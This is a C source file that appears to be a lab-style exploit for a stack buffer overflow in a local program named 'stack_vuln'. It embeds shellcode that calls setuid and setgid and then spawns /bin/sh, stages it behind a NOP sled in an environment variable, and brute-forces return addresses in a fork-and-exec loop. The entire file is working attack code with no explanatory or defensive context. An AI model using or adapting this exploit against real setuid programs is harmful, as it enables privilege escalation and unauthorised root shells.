#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

char shellcode[]=
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
"\xb0\x2e\xcd\x80\xeb\x15\x5b\x31"
"\xc0\x88\x43\x07\x89\x5b\x08\x89"
"\x43\x0c\x8d\x4b\x08\x31\xd2\xb0"
"\x0b\xcd\x80\xe8\xe6\xff\xff\xff"
"/bin/sh";

unsigned long get_sp(void)
{
  __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[])
{ 
  char buf[500];
  char *egg, *ptr;
  char *av[3], *ev[2];
  pid_t pid;
  int i, step, offset = 0;
  long esp, ret;
  int status;

  if (argc < 2) {
    fprintf(stderr, "Usage: %s <step>\n", argv[0]);
    exit(-1);
  }

  step = atoi(argv[1]);
  esp = get_sp();
  ret = esp;

  egg = (char *)malloc(1000);
  sprintf(egg, "EGG=");
  memset(egg + 4, 0x90, 1000 - 1 - strlen(shellcode));
  sprintf(egg + 1000 - 1 - strlen(shellcode), "%s", shellcode);

  ptr = buf;
  bzero(buf, sizeof(buf));

  while(offset <= 3000)
  {
    if ((pid = fork()) == 0)
    {
      for(i = 0; i <= 500; i += 4)
        {*(long *)(ptr + i) = ret;}

      av[0] = "./stack_vuln";
      av[1] = buf;
      av[2] = 0;
      ev[0] = egg;
      ev[1] = 0;
      execve(*av, av, ev);
      exit(status);
    } 

    wait(&status);
  
    if (WIFEXITED(status) != 0) {
      fprintf(stderr, "The end: %#x\n", ret);
      exit(-1);
    } else {
      ret += offset;
      offset += step;
      fprintf(stderr, "Trying offset %d, addr: %#x\n", offset, ret);
    }	
  }

  return 0;
}
